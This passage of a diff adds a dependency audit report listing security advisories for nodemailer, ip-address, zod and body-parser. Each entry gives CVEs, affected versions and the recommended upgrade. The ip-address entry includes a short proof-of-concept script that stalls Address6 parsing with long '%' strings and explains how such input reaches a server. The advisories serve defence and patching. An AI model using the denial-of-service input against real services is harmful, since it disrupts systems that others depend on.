an oversized folded header cannot force unbounded work. As an interim mitigation, applications should cap recipient counts and header-value sizes for messages that will be DKIM-signed.\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "Nodemailer: Quadratic (O(n^2)) DKIM header unfolding lets a large folded header cause remote denial of service during signing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110871"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <=10.0.9",
+      "github_advisory_id": "GHSA-39m8-27wv-hr27",
+      "recommendation": "Upgrade to version 10.0.10 or later",
+      "patched_versions": ">=10.0.10",
+      "updated": "2026-10-22T16:07:06.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-39m8-27wv-hr27"
+    },
+    "1242883": {
+      "findings": [
+        {
+          "version": "10.7.1",
+          "paths": [
+            "apps__alloy-embedding-api>express-rate-limit>ip-address"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/beaugunderson/ip-address/security/advisories/GHSA-rxp7-6hxx-x8q5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111997\n- https://github.com/beaugunderson/ip-address/commit/ec80fcd5d7b97defecfd39717d782a9f9f8b89dd\n- https://github.com/beaugunderson/ip-address/releases/tag/v10.7.4\n- https://github.com/advisories/GHSA-rxp7-6hxx-x8q5",
+      "created": "2026-10-22T16:19:39.000Z",
+      "id": 1242883,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`new Address6()` and `Address6.isValid()` strip a zone identifier with the pattern `/%.*$/` before they apply the 45-character length limit. When the string holds many `%` characters followed by a line terminator, the pattern is retried from every `%` and each attempt scans to the line terminator before failing, so rejecting the string takes time proportional to the square of its length. 10,000 `%` characters and a newline take 41 ms, 40,000 take 632 ms and 100,000 take 3.9 s of synchronous work. The same strings without the newline are rejected in under a millisecond.\n\nAn application that validates an attacker-supplied string with these methods can be stalled by a single long request. The input is rejected with the correct `AddressError`; the cost of reaching that rejection is the defect.\n\n### Details\n\nThe constructor in `src/ipv6.ts` removes the CIDR suffix, then the zone, then checks the length of what is left:\n\n```ts\nconst zone = constants6.RE_ZONE_STRING.exec(address);\n\nif (zone) {\n  this.zone = zone[0];\n\n  address = address.replace(constants6.RE_ZONE_STRING, '');\n}\n\nconst longest = this.groups * 5 + 5;\n\nif (address.length > longest) {\n  throw new AddressError(`IPv6 addresses are at most ${longest} characters.`);\n}\n```\n\n`RE_ZONE_STRING` is `/%.*$/`. It has no anchor at its start, `.` does not match a line terminator (`\\n`, `\\r`, U+2028 or U+2029), and without the `m` flag `$` matches only at the end of the input. For `%` repeated N times and then `\\n`, the engine starts a match at the first `%`, `.*` consumes the remaining `%` characters up to the newline, `$` fails there, and backtracking through every shorter `.*` fails too. The engine then starts again at the second `%`, and so on: N starts, each proportional to N. The length limit that follows rejects the string in constant time, after the scan has already run.\n\nThe line terminator need not be last. Any string in which many `%` characters precede a line terminator behaves the same way.\n\nEvery entry point that passes a caller's string to the `Address6` constructor is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromWildcard()` rejects a `%` before it constructs anything, `fromURL()` admits only hex digits, colons and dots in a host, and `fromArpa()` checks the nibble grammar first, so those three are unaffected. `Address4` has no zone and is unaffected.\n\n### Affected versions\n\n`<= 10.7.3`. The zone pattern has been in the constructor since 1.0.0; 5.9.4, 9.0.5 and 10.7.0 show the same timings as 10.7.3.\n\n### Impact\n\n`Address6.isValid()` on N `%` characters and a newline, measured on ip-address 10.7.3 and node 24.21.0:\n\n| Input | Wall time | Same length of `!` |\n|---|---|---|\n| 5,461 characters | 13 ms | 0.1 ms |\n| 16 KiB | 108 ms | 0.1 ms |\n| 100 KB | 3.9 s | 0.1 ms |\n| 256 KiB | 27 s | 0.2 ms |\n\nThe parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. No memory is retained and the process resumes when the call returns.\n\n### Reachability\n\nThe input needs a line terminator after the `%` characters, which decides where it can arrive. An HTTP header value cannot carry a carriage return or a line feed, so a host or address taken from a header does not reach this. A URL can carry both characters percent-encoded at three bytes each, and Node's default 16 KB limit on the request line and headers admits about 5,461 of them: 13 ms. A request body is where the larger sizes come from. Common body parsers default to between 100 KB and 1 MB, and at 100 KB one field passed to the parser unchecked blocks the process for 3.9 s.\n\n### Proof of concept\n\n`npm i ip-address@10.7.3`, then:\n\n```js\nconst { Address6 } = require('ip-address');\n\nfunction time(input) {\n  const start = process.hrtime.bigint();\n\n  Address6.isValid(input);\n\n  return `${(Number(process.hrtime.bigint() - start) / 1e6).toFixed(1)} ms`;\n}\n\nfor (const n of [10000, 20000, 40000, 100000]) {\n  console.log(`${n}: ${time(`${'%'.repeat(n)}\\n`)}, without the newline ${time('%'.repeat(n))}`);\n}\n```\n\nOn affected versions (node 24.21.0):\n\n```\n10000: 41.0 ms, without the newline 0.0 ms\n20000: 161.1 ms, without the newline 0.0 ms\n40000: 632.4 ms, without the newline 0.1 ms\n100000: 3899.8 ms, without the newline 0.1 ms\n```\n\nEach doubling of the input multiplies the time by four.\n\n### Remediation\n\nUpgrade to the patched release. In the fix, the constructor finds the zone by the index of the first `%` and accepts the remainder as a zone only when it holds no line terminator, which reads the input once. 1 MiB of the input above is rejected in about a millisecond. Every address that parsed before parses to the same result, and a string with a line terminator after a `%` is rejected as it was.\n\n`RE_ZONE_STRING` stays exported from `v6/constants` for code that imports it directly and is marked `@deprecated`; the library itself does not call it.\n\nIf you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:\n\n```js\nif (host.length > 64) throw new Error('not an IP address');\n```",
+      "reported_by": null,
+      "title": "ip-address: Address6 matches a zone identifier in quadratic time ahead of its length limit, allowing a single long string to stall the process",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111997"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ip-address",
+      "vulnerable_versions": "<=10.7.3",
+      "github_advisory_id": "GHSA-rxp7-6hxx-x8q5",
+      "recommendation": "Upgrade to version 10.7.4 or later",
+      "patched_versions": ">=10.7.4",
+      "updated": "2026-10-22T16:19:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-rxp7-6hxx-x8q5"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "3.25.67",
+          "paths": [
+            ".>@openai/agents>@openai/agents-core>zod"
+          ]
+        },
+        {
+          "version": "3.25.76",
+          "paths": [
+            "apps__alloy-embedding-api>zod"
+          ]
+        },
+        {
+          "version": "4.4.3",
+          "paths": [
+            "lib__ai-engine>@anthropic-ai/sdk>zod"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243074": {
+      "findings": [
+        {
+          "version": "2.3.0",
+          "paths": [
+            ".>express>body-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-27r3-jxmh-p828\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111181\n- https://github.com/expressjs/body-parser/commit/1260c3845f54502a05a87594f09a334786bb34d7\n- https://github.com/expressjs/body-parser/commit/f7075eae3a84c3473ab4bf0a777da28db208e916\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.9\n- https://github.com/expressjs/body-parser/releases/tag/v2.4.0\n- https://github.com/advisories/GHSA-27r3-jxmh-p828",
+      "created": "2026-10-23T20:53:11.000Z",
+      "id": 1243074,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA single request can crash any application using `body-parser` with default options. When a request carries a `Content-Encoding` (for example `gzip`), `body-parser` pipes it into a decompression stream and, after reading the body, leaves that stream piped with no error listener. A payload of one valid compressed frame followed by trailing bytes decodes and the application responds normally, but the trailing bytes then reach the already-finished decoder, which emits an error that is re-thrown as an uncaught exception and terminates the process. No authentication or matching route is required, since parsing runs before routing.\n\n### Patches\n\nFixed in body-parser 2.4.0 and 1.20.9. Upgrade to one of these versions.\n\n### Workarounds\n\nPass `inflate: false` to the body-parser middleware if the application does not need to accept compressed request bodies. This rejects encoded requests before any decompression stream is created.",
+      "reported_by": null,
+      "title": "body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111181"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "body-parser",
+      "vulnerable_versions": ">=2.0.0 <2.4.0",
+      "github_advisory_id": "GHSA-27r3-jxmh-p828",
+      "recommendation": "Upgrade to version 2.4.0 or later",
+      "patched_versions": ">=2.4.0",
+      "updated": "2026-10-23T20:53:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-27r3-jxmh-p828"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 11,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 1824,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1824
+  }
+}
